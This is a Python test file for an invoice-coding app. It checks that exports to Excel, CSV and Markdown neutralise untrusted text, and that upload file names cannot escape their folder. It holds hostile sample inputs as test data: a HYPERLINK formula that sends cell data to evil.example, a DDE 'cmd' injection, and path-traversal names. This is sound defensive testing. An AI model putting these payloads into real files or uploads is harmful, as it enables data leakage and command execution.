"""Untrusted text is made safe for spreadsheets, Markdown and file names."""

import io
import json

from openpyxl import load_workbook

from ap_coder import exports
from ap_coder.safe import csv_cell, md
from ap_coder.statements import Line, Reconciliation, to_csv

from .conftest import SAMPLE_STEM, SAMPLES

EVIL = '=HYPERLINK("http://evil.example/?d="&A2,"Click")'


def _invoice():
    gt = json.loads((SAMPLES / "ground_truth" / f"{SAMPLE_STEM}.json").read_text())
    gt["vendor_name"] = EVIL
    gt["line_items"][0]["description"] = "+cmd|' /C calc'!A0"
    gt["gl_distribution"] = [
        {"kind": "expense", "line_number": 1, "gl_code": "6010", "cost_center": "", "net_amount": -10.0,
         "non_recoverable_tax": 0.0, "amount": -10.0, "description": "@SUM(1+1)"},
    ]  # fmt: skip
    return {"id": 1, "final_output": gt, "reviewer": "Jane", "reviewed_at": "2026-10-01T10:00:00", "file_name": "a.pdf"}


def test_excel_export_has_no_formulas():
    data, _, _ = exports.build("xlsx", [_invoice()], {}, 1)
    wb = load_workbook(io.BytesIO(data))
    cells = [c for ws in wb.worksheets for row in ws.iter_rows() for c in row]
    assert not [c.coordinate for c in cells if c.data_type == "f"]
    assert any(c.value == EVIL for c in cells)  # the text itself is kept
    assert any(c.value == -10 and c.data_type == "n" for c in cells)  # negative amounts stay numbers


def test_csv_downloads_neutralise_formulas_but_keep_numbers():
    text = exports.build("csv", [_invoice()], {}, 1)[0].decode("utf-8-sig")
    assert "'=HYPERLINK" in text and "'@SUM" in text and ",-10.0," in text
    rec = Reconciliation([Line("not_received", "=1+2", "2026-09-01", -5.0, note="-Payment")])
    out = to_csv(rec).decode("utf-8-sig")
    assert "'=1+2" in out and "-5.00" in out and "'-Payment" in out
    assert csv_cell("-12.50") == "-12.50" and csv_cell(-3) == -3 and csv_cell("plain") == "plain"


def test_markdown_is_literal():
    assert md("Acme [Pay](https://evil.example)") == r"Acme \[Pay\]\(https\://evil.example\)"
    assert md(None) == ""


def test_upload_names_cannot_leave_the_folder():
    from ap_coder.webapp.process import safe_file_name

    assert safe_file_name("../../../../etc/cron.d/x.pdf") == "x.pdf"
    assert safe_file_name("/etc/x.pdf") == "x.pdf"
    assert safe_file_name("C:\\Windows\\System32\\x.pdf") == "x.pdf"
    assert safe_file_name("..") == "invoice" and safe_file_name("") == "invoice"
    assert safe_file_name(".hidden.pdf") == "hidden.pdf"
    assert safe_file_name("Facture été 2026.pdf") == "Facture été 2026.pdf"
